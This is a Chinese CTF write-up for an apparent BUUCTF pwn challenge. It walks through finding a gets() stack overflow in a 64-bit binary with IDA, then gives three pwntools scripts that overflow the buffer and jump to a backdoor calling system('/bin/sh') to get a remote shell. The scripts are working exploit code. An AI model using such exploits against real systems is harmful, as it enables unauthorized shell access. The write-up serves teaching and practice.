# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743409613424-2cc955a6-9fbe-4707-b95c-5dfbf3b2e457.png)

# 方法一

常规，启动靶机，扔进虚拟机checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743409672884-13470c2c-c28b-429c-b921-351b49a0c621.png)

64位，没有栈保护

扔进IDA（64位），找到main，F5反编译

如下

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743409767701-5eab1431-2cf3-4bbb-8c12-dffa388642b1.png)

其他没啥用，我们看到有gets函数（gets函数不会检查输入字符串的长度，若用户输入的字符串长度超过了 `str` 所指向数组的大小，就会发生缓冲区溢出。）

gets若没有遇到 \n 结束，则会无限读取，没有上限。

gets函数这行的意思是它会把我们在“please input”后输入的东西放进&s中（即gets函数的缓冲区）

我们双击s

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743410475555-3082b32a-cd70-4e55-9088-a748f5a76bd7.png)

自上往下从第一个函数s到最后一个函数s的地址（都是标蓝的）便是缓冲区大小

我们发送字节数据塞满它，然后把它的后门函数写入，我们就拿到了他的shell

从第一个s往下数到s，也可以直接用左边的F（在十六进制中是15）减去“s”左边的0即得大小为15

然后我们按Shift+F12打开string窗口，一键找出所有的字符串，去寻找它的后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743411597883-a4994994-94ed-4548-88fb-35de7ffc6089.png)

我们看到system和/bin/sh

system点进去没啥东西，我们双击点进/bin/sh

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743411658700-37edfef5-29c9-4b7b-a819-d9151f607d74.png)

然后直接按Ctrl+x查看是哪里调用了它

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743411697605-cbd4aa2f-69f1-4652-b57f-4932a67f4006.png)

确定

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743413518856-737f1223-c401-4352-9c1e-48cfc77f7d03.png)

发现是fun函数，直接把401186（fun函数地址）复制下来

然后返回虚拟机编写exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743421583064-d289e43c-f0e9-410e-aa4e-df63472aa00e.png)

代码如下

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29132)

#定义 payload
payload = b'a' * 23 +p64(0x40118A)+ p64(0x401186)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

注：这里直接塞字节数据和填后门函数地址是不行的

觉得自己脚本没写错就要考虑堆栈平衡（64位系统）：

需要找lea的地址或者该函数结束即retn的地址,写在(空括号内)

payload = b'a' * 23 + ()+ p64(0x401198) ——这是没有考虑堆栈平衡时的payload（减去+（））

这里我们找到的后门函数地址是fun的

我们拖动IDA上方蓝条

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743421976471-4b187245-b9a9-4a9e-b4bb-1655171d63fa.png)

找到fun函数所在地址

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743422016263-3d89c2c1-8e61-4d66-a64b-a527c0d4f425.png)

注：直接拖动找（在蓝色区域范围内），或者是在上面找到后门函数的时候（此页面）点击这个白色小箭头，即可来到fun函数附近（注:在汇编页面的时候拖，而不是c语言）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743422216626-3351f1f6-ce0d-4782-832f-6deb73e20f61.png)

我上面填的地址是lea的，你们可自行尝试retn的地址（fun函数内的）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743421716582-671a459c-ee01-4168-88a1-47e65a34280d.png)

# 方法二

其他步骤基本同上，只是塞字节数据时没有加上返回地址大小

（对比一下不同方法的exp就知道区别了，方法三同理）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743413708112-2f2c1076-ee84-42b1-b519-983d701debbc.png)

代码如下

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29034)

#定义 payload
payload = b'a' * 15+ p64(0x401186)
#注：b前缀表示这是一个字符串
#b'a' 代表一个包含单个字节 a 的字节串
#''里的字母可替换成任意其他字符
#只要将其表示为字符串即可
#其实b'a' * 15就是我们塞进去的字节数据
#然后因为这个程序是64位的，所以我们写成p64（32位的即写成p32）
#p64 函数的作用是把一个64位的整数（以十六进制表示）转换为对应的 8 字节小端序字节串
#p64（）内的即上面找到的后门函数地址，我们通常用Python编写脚本
#因此有以下规定
#二进制：加 0b 或者 0B，例如 0b1010。
#八进制：加 0o 或者 0O，例如 0o12。
#十进制：无需加前缀，直接写数字，例如 10。
#十六进制：加 0x 或者 0X，例如 0xA。

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1743413663240-9661cc3d-b1b5-42b7-8bf8-dbf45da67585.png)

然后常规，得出flag

# 方法三

这里直接在方法一没有堆栈平衡时的payload中后门函数后直接+1

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29034)

#定义 payload
payload = b'a' * 23 + p64(0x401186+1)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

# 更新：

于2025.3.31